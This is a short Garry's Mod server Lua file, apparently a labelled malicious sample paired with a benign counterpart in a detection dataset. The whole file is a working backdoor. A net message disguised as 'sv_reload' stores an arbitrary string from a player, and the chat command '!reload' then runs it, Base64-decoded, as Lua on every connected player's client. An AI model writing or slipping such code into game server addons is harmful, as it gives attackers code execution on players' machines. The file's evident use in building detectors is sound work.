-- Pushes attacker-supplied Lua to a client. The counterpart in
-- benign/gamemode_sendlua.lua does the same call with a fixed template, which
-- is what Garry's Mod's own gamemodes do everywhere.

local staged = {}

net.Receive( "sv_reload", function( len, ply )
	staged[ ply:SteamID() ] = net.ReadString()
end )

hook.Add( "PlayerSay", "sv_reload_dispatch", function( ply, text )
	if text ~= "!reload" then return end

	local payload = staged[ ply:SteamID() ]
	if not payload then return end

	ply:SendLua( payload )

	for _, other in ipairs( player.GetAll() ) do
		other:SendLua( util.Base64Decode( payload ) )
	end
end )
